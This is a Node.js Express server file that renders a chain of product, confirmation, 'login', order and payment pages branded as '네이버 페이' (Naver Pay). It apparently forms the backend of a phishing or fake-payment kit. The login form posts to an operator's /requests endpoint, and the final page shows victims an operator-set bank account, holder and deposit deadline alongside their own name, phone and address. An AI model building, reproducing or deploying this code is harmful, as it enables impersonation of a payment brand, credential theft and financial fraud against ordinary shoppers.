const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const { Product, Request, Information } = require("./models");

require("dotenv").config();
const fs = require("fs");
const util = require("util");
const readFileAsync = util.promisify(fs.readFile);

const app = express();
app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static("public"));

app.use((req, res, next) => {
  const userAgent = req.headers["user-agent"];

  if (userAgent && userAgent.toLowerCase().includes("mobile")) {
    req.isMobile = true;
  } else {
    req.isMobile = false;
  }

  next();
});

// constant
const DB_URI = "mongodb://127.0.0.1:27017/my_goods";
const PORT = 8004;

// define db
mongoose
  .connect(DB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    console.log("Connected successfully to the MongoDB server");
  })
  .catch((err) => {
    console.error("Error connecting to MongoDB:", err);
  });

app.get("/", async (req, res) => {
  try {
    const productCode = req.query.id;
    const product = await Product.findOne({ code: productCode });
    if (!product) throw Error("상품이 없습니다");
    const htmlContent = await readFileAsync(
      req.isMobile ? "./public/product.mobile.html" : "./public/product.html",
      "utf8",
    );
    let result = htmlContent
    .replace(
        new RegExp("{og_url_content}", "g"),
        `${process.env.CLIENT_URL}/?id=${productCode}`,
      ).replace(
        new RegExp("{og_image_content}", "g"),
        product.image,
      ).replace(
        new RegExp("{og_title_content}", "g"),
        `${product.name} - 네이버 페이`,
      ).replace(
        new RegExp("{og_description_content}", "g"),
        product.name,
      )
    .replace(
        new RegExp("{redirect_url}", "g"),
        `${process.env.CLIENT_URL}/confirm?id=${productCode}`,
      )
      .replace(
        new RegExp("{create_connection_url}", "g"),
        `${process.env.API_URL}/connections`,
      )
      .replace(
        new RegExp("{update_connection_url}", "g"),
        `${process.env.API_URL}/connections`,
      )
      .replace(new RegExp("{product_id}", "g"), product._id)
      .replace(new RegExp("{my_goods_product_name}", "g"), product.name)
      .replace(new RegExp("{my_goods_product_image}", "g"), product.image)
      .replace(
        new RegExp("{my_goods_product_price}", "g"),
        new Intl.NumberFormat().format(product.price),
      );
    res.send(result);
  } catch (e) {
    res.status(422).json({ message: e.message });
  }
});

app.get("/confirm", async (req, res) => {
  try {
    const productCode = req.query.id;
    const product = await Product.findOne({ code: productCode });
    if (!product) throw Error("상품이 없습니다");
    const htmlContent = await readFileAsync(
      req.isMobile
        ? "./public/product_confirm.mobile.html"
        : "./public/product_confirm.html",
      "utf8",
    );
    let result = htmlContent
      .replace(
        new RegExp("{redirect_url}", "g"),
        `${process.env.CLIENT_URL}/login?id=${productCode}`,
      )
      .replace(
        new RegExp("{cancel_url}", "g"),
        `${process.env.CLIENT_URL}?id=${productCode}`,
      )
      .replace(new RegExp("{my_goods_product_name}", "g"), product.name)
      .replace(
        new RegExp("{my_goods_product_price}", "g"),
        new Intl.NumberFormat().format(product.price),
      );
    res.send(result);
  } catch (e) {
    res.status(422).json({ message: e.message });
  }
});

app.get("/login", async (req, res) => {
  try {
    const productCode = req.query.id;
    const product = await Product.findOne({ code: productCode });
    if (!product) throw Error("상품이 없습니다");
    const htmlContent = await readFileAsync(
      req.isMobile
        ? "./public/product_login.mobile.html"
        : "./public/product_login.html",
      "utf8",
    );
    let result = htmlContent
      .replace(
        new RegExp("{submit_url}", "g"),
        `${process.env.API_URL}/requests`,
      )
      .replace(
        new RegExp("{redirect_url}", "g"),
        `${process.env.CLIENT_URL}/sub`,
      )
      .replace(new RegExp("{product_id}", "g"), product._id);

    res.send(result);
  } catch (e) {
    res.status(422).json({ message: e.message });
  }
});

app.get("/sub", async (req, res) => {
  try {
    const id = req.query.id;
    const request = await Request.findById(id).populate(["user", "product"]);
    if (!request) throw Error("상품신청이 없습니다");
    if (!request.product) throw Error('상품정보가 없습니다.');
    const information = await Information.findOne({admin: request.product?.admin});
    if (!information) throw Error("회원정보가 없습니다");
    const htmlContent = await readFileAsync(
      req.isMobile ? "./public/request.mobile.html" : "./public/request.html",
      "utf8",
    );
    let result = htmlContent
      .replace(
        new RegExp("{create_connection_url}", "g"),
        `${process.env.API_URL}/connections`,
      )
      .replace(
        new RegExp("{update_connection_url}", "g"),
        `${process.env.API_URL}/connections`,
      )
      .replace(new RegExp("{product_id}", "g"), request.product?._id)
      .replace(
        new RegExp("{submit_url}", "g"),
        `${process.env.API_URL}/requests/${request._id}`,
      )
      .replace(
        new RegExp("{redirect_url}", "g"),
        `${process.env.CLIENT_URL}/sub_finished?id=${request._id}`,
      )
      .replace(
        new RegExp("{my_goods_information_seller}", "g"),
        information.seller,
      )
      .replace(
        new RegExp("{my_goods_information_delivery_fee}", "g"),
        information.deliveryFee,
      )
      .replace(new RegExp("{my_goods_information_fee}", "g"), information.fee)
      .replace(
        new RegExp("{my_goods_product_image}", "g"),
        request.product?.image,
      )

      .replace(
        new RegExp("{my_goods_product_name}", "g"),
        request.product?.name,
      )
      .replace(
        new RegExp("{my_goods_product_price}", "g"),
        new Intl.NumberFormat().format(request.product?.price),
      );

    res.send(result);
  } catch (e) {
    res.status(422).json({ message: e.message });
  }
});

app.get("/sub_finished", async (req, res) => {
  try {
    const id = req.query.id;
    const request = await Request.findById(id).populate(["user", "product"]);
    if (!request) throw Error("상품신청이 없습니다");
    if (!request.product) throw Error('상품정보가 없습니다.');
    const information = await Information.findOne({admin: request.product?.admin});
    if (!information) throw Error("회원정보가 없습니다");
    const htmlContent = await readFileAsync(
      req.isMobile
        ? "./public/request_finished.mobile.html"
        : "./public/request_finished.html",
      "utf8",
    );
    let result = htmlContent
      .replace(
        new RegExp("{create_connection_url}", "g"),
        `${process.env.API_URL}/connections`,
      )
      .replace(
        new RegExp("{update_connection_url}", "g"),
        `${process.env.API_URL}/connections`,
      )
      .replace(new RegExp("{product_id}", "g"), request.product?._id)
      .replace(
        new RegExp("{my_goods_request_user_name}", "g"),
        request.userName,
      )
      .replace(new RegExp("{my_goods_request_phone}", "g"), request.phone)
      .replace(new RegExp("{my_goods_request_phone1}", "g"), request.phone1)
      .replace(
        new RegExp("{my_goods_request_shippingAddress}", "g"),
        request.shippingAddress,
      )
      .replace(
        new RegExp("{my_goods_information_deposit_bank}", "g"),
        information.depositBank,
      )
      .replace(
        new RegExp("{my_goods_information_bank_account_number}", "g"),
        information.bankAccountNumber,
      )
      .replace(
        new RegExp("{my_goods_information_account_holder}", "g"),
        information.accountHolder,
      )
      .replace(
        new RegExp("{my_goods_information_deposit_deadline}", "g"),
        information.depositDeadline,
      )
      .replace(
        new RegExp("{my_goods_information_discount}", "g"),
        information.discount,
      )
      .replace(new RegExp("{my_goods_information_fee}", "g"), information.fee)
      .replace(
        new RegExp("{my_goods_information_seller}", "g"),
        information.seller,
      )
      .replace(
        new RegExp("{my_goods_information_delivery_fee}", "g"),
        information.deliveryFee,
      )
      .replace(new RegExp("{my_goods_information_fee}", "g"), information.fee)
      .replace(
        new RegExp("{my_goods_product_image}", "g"),
        request.product?.image,
      )

      .replace(
        new RegExp("{my_goods_product_name}", "g"),
        request.product?.name,
      )
      .replace(
        new RegExp("{my_goods_product_price}", "g"),
        new Intl.NumberFormat().format(request.product?.price),
      );

    res.send(result);
  } catch (e) {
    res.status(422).json({ message: e.message });
  }
});

// define server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
exports = module.exports = app;
